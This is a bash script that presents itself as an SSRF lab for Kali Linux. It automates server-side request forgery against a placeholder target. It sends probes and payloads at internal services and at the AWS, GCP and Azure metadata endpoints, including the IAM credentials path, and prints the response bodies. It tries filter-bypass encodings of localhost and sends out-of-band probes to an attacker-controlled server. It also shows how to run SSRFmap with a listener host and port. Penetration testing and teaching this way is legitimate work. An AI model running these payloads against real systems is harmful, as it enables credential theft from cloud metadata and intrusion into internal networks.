#!/bin/bash
# ============================================================
# A10:2021 — Server-Side Request Forgery (SSRF)
# Kali Linux Attack & Analysis Script
# ============================================================
# Tools used: curl, python3, nmap, interactsh
# Usage: bash a10_ssrf.sh
# ============================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

TARGET="http://TARGET_IP_OR_DOMAIN"
# ATTACKER_SERVER: set to your interactsh/burp-collaborator URL for OOB detection
ATTACKER_SERVER="YOUR_COLLABORATOR_OR_INTERACTSH_URL"

echo -e "${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════════════╗"
echo "║  A10:2021 — SSRF Lab                            ║"
echo "╚══════════════════════════════════════════════════╝${NC}"
echo ""

mkdir -p /tmp/a10_demo

# ─────────────────────────────────────────────
# SECTION 1: SSRF Endpoint Discovery
# ─────────────────────────────────────────────
echo -e "${BOLD}[1] Discovering SSRF-Prone Endpoints${NC}"
echo -e "${YELLOW}    Looking for parameters that accept URLs or fetch remote resources${NC}"
echo ""

SSRF_PARAM_NAMES=("url" "uri" "link" "src" "source" "path" "dest" "redirect" "target" "fetch" "load" "resource" "proxy" "callback" "webhook" "endpoint" "import" "download" "host" "from" "to" "image" "preview" "imageUrl" "file" "ref")

echo -e "    ${CYAN}Parameters commonly vulnerable to SSRF:${NC}"
for param in "${SSRF_PARAM_NAMES[@]}"; do
  printf "    ${YELLOW}%-20s${NC}\n" "$param"
done | paste - - - -
echo ""

echo -e "    ${CYAN}[1a] Test each suspicious parameter with an internal address:${NC}"
echo ""

SSRF_TEST_ENDPOINTS=(
  "$TARGET/api/fetch?url=PAYLOAD"
  "$TARGET/preview?link=PAYLOAD"
  "$TARGET/image?src=PAYLOAD"
  "$TARGET/proxy?target=PAYLOAD"
  "$TARGET/download?path=PAYLOAD"
  "$TARGET/webhook?endpoint=PAYLOAD"
)

SSRF_INTERNAL_PAYLOAD="http://127.0.0.1:80/"
SSRF_LOCALHOST_PAYLOAD="http://localhost/"

for endpoint_template in "${SSRF_TEST_ENDPOINTS[@]}"; do
  endpoint="${endpoint_template/PAYLOAD/$SSRF_INTERNAL_PAYLOAD}"
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 "$endpoint" 2>/dev/null)
  RESPONSE_LEN=$(curl -s --max-time 8 "$endpoint" 2>/dev/null | wc -c)

  if [ "$STATUS" == "200" ] && [ "$RESPONSE_LEN" -gt "100" ]; then
    echo -e "    ${RED}[POSSIBLE SSRF!]${NC} $endpoint_template"
    echo -e "    ${RED}  → HTTP $STATUS, response length: $RESPONSE_LEN bytes${NC}"
  else
    echo -e "    [HTTP $STATUS, ${RESPONSE_LEN}B] $(echo "$endpoint_template" | sed 's|PAYLOAD||')"
  fi
done
echo ""

# ─────────────────────────────────────────────
# SECTION 2: SSRF Payloads — Internal Network Probing
# ─────────────────────────────────────────────
echo -e "${BOLD}[2] SSRF Payload Library — Internal Network Probing${NC}"
echo -e "${YELLOW}    Testing various target addresses via SSRF${NC}"
echo ""

SSRF_URL_PARAM="$TARGET/api/fetch?url"   # Adjust to actual vulnerable parameter

# Different SSRF payload types
declare -A SSRF_PAYLOADS
SSRF_PAYLOADS=(
  ["Localhost HTTP"]="http://127.0.0.1/"
  ["Localhost HTTPS"]="https://127.0.0.1/"
  ["IPv6 Localhost"]="http://[::1]/"
  ["0.0.0.0"]="http://0.0.0.0/"
  ["Internal 192.168.1.1"]="http://192.168.1.1/"
  ["Internal 10.0.0.1"]="http://10.0.0.1/"
  ["AWS Metadata"]="http://169.254.169.254/latest/meta-data/"
  ["AWS IAM Creds"]="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  ["GCP Metadata"]="http://metadata.google.internal/computeMetadata/v1/"
  ["Azure Metadata"]="http://169.254.169.254/metadata/instance?api-version=2021-02-01"
  ["Localhost:8080"]="http://127.0.0.1:8080/"
  ["Localhost:6379 (Redis)"]="http://127.0.0.1:6379/"
  ["Localhost:5432 (Postgres)"]="http://127.0.0.1:5432/"
  ["Localhost:27017 (MongoDB)"]="http://127.0.0.1:27017/"
  ["Localhost:9200 (ElasticSearch)"]="http://127.0.0.1:9200/"
  ["Localhost:2375 (Docker API)"]="http://127.0.0.1:2375/version"
)

echo -e "    ${CYAN}Sending SSRF probes via: $SSRF_URL_PARAM=<payload>${NC}"
echo ""
for label in "${!SSRF_PAYLOADS[@]}"; do
  payload="${SSRF_PAYLOADS[$label]}"
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${SSRF_URL_PARAM}=${ENCODED}" 2>/dev/null)
  BODY=$(curl -s --max-time 5 "${SSRF_URL_PARAM}=${ENCODED}" 2>/dev/null)
  LEN=$(echo "$BODY" | wc -c)

  if [ "$STATUS" == "200" ] && [ "$LEN" -gt "50" ]; then
    echo -e "    ${RED}[RESPONSE!]${NC} $(printf '%-30s' "$label") → HTTP $STATUS, ${LEN}B"
    # If it's the metadata endpoint, show the body (it might have IAM creds!)
    if echo "$label" | grep -qi "AWS\|GCP\|Azure\|Metadata"; then
      echo -e "    ${RED}  RESPONSE BODY:${NC}"
      echo "$BODY" | head -10 | while IFS= read -r line; do
        echo -e "    ${RED}  $line${NC}"
      done
    fi
  else
    echo -e "    [HTTP $STATUS, ${LEN}B] $(printf '%-30s' "$label")"
  fi
done
echo ""

# ─────────────────────────────────────────────
# SECTION 3: SSRF Filter Bypass Techniques
# ─────────────────────────────────────────────
echo -e "${BOLD}[3] SSRF Filter Bypass Techniques${NC}"
echo -e "${YELLOW}    Evading naive blocklists that only check string patterns${NC}"
echo ""

echo -e "    ${CYAN}Bypass payloads that resolve to 127.0.0.1 but evade string filters:${NC}"
echo ""

BYPASS_PAYLOADS=(
  "http://2130706433/"              # 127.0.0.1 as decimal integer
  "http://0x7f000001/"             # 127.0.0.1 as hexadecimal
  "http://0177.0.0.1/"            # 127.0.0.1 in octal
  "http://127.1/"                  # Shortened localhost
  "http://127.0.0.1.nip.io/"     # DNS that resolves to 127.0.0.1
  "http://localtest.me/"           # resolves to 127.0.0.1
  "http://[::ffff:127.0.0.1]/"   # IPv4-mapped IPv6
  "http://[0:0:0:0:0:ffff:7f00:0001]/"  # Full IPv6 form
  "http://①②⑦.⓪.⓪.①/"       # Unicode lookalike digits
  "http://127。0。0。1/"          # Unicode dots
  "http://①②⑦.①/"              # Mixed
)

for payload in "${BYPASS_PAYLOADS[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null || echo "$payload")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 "${SSRF_URL_PARAM}=${ENCODED}" 2>/dev/null)

  if [ "$STATUS" == "200" ]; then
    echo -e "    ${RED}[BYPASS WORKS!]${NC} $payload → HTTP $STATUS"
  elif [ "$STATUS" == "403" ] || [ "$STATUS" == "400" ]; then
    echo -e "    [BLOCKED: $STATUS] $payload"
  else
    echo -e "    [HTTP $STATUS]  $payload"
  fi
done

echo ""
echo -e "    ${YELLOW}[TIP] Use DNS rebinding (rebind.it) to bypass time-of-check vs time-of-use filters:${NC}"
echo -e "    ${BOLD}# Register: attacker.com → first resolves to 1.2.3.4 (allowed),${NC}"
echo -e "    ${BOLD}# then switches to 127.0.0.1 (internal) after allowlist check passes${NC}"
echo ""

# ─────────────────────────────────────────────
# SECTION 4: Out-of-Band SSRF Detection
# ─────────────────────────────────────────────
echo -e "${BOLD}[4] Out-of-Band SSRF Detection${NC}"
echo -e "${YELLOW}    Using interactsh / Burp Collaborator to detect blind SSRF${NC}"
echo ""

echo -e "    ${CYAN}[4a] Set up interactsh listener (free, open-source):${NC}"
echo -e "    ${BOLD}# Install:${NC}"
echo -e "    ${BOLD}go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest${NC}"
echo -e "    ${BOLD}# OR download from: https://github.com/projectdiscovery/interactsh/releases${NC}"
echo ""
echo -e "    ${BOLD}# Start listening:${NC}"
echo -e "    ${BOLD}interactsh-client -v${NC}"
echo -e "    ${YELLOW}# It gives you a unique URL like: abcdef1234.oast.pro${NC}"
echo ""

echo -e "    ${CYAN}[4b] Send blind SSRF probe:${NC}"
if [ "$ATTACKER_SERVER" != "YOUR_COLLABORATOR_OR_INTERACTSH_URL" ]; then
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('http://$ATTACKER_SERVER/ssrf_test'))" 2>/dev/null)
  echo -e "    Sending probe to $SSRF_URL_PARAM=http://$ATTACKER_SERVER/ssrf_test"
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "${SSRF_URL_PARAM}=${ENCODED}" 2>/dev/null)
  echo -e "    HTTP Response: $STATUS (check your interactsh listener for a DNS/HTTP hit)"
else
  echo -e "    ${YELLOW}[!] Set ATTACKER_SERVER variable to your interactsh or Burp Collaborator URL.${NC}"
  echo -e "    ${BOLD}${SSRF_URL_PARAM}=http://YOUR_INTERACTSH_URL/ssrf_probe${NC}"
fi
echo ""

echo -e "    ${CYAN}[4c] SSRFmap — automated SSRF exploitation tool:${NC}"
echo ""
echo -e "    ${YELLOW}# Install:${NC}"
echo -e "    ${BOLD}git clone https://github.com/swisskyrepo/SSRFmap.git /opt/SSRFmap${NC}"
echo -e "    ${BOLD}pip3 install -r /opt/SSRFmap/requirements.txt${NC}"
echo ""
echo -e "    ${YELLOW}# Usage — scan all parameters in a request file:${NC}"
echo -e "    ${BOLD}# 1. Save a raw HTTP request from Burp to /tmp/request.txt${NC}"
echo -e "    ${BOLD}python3 /opt/SSRFmap/ssrfmap.py -r /tmp/request.txt -p url --lhost $ATTACKER_SERVER --lport 4444 -m portscan${NC}"
echo ""

echo -e "${CYAN}${BOLD}[A10 Complete]${NC} Document all SSRF findings, especially cloud metadata access."
echo ""
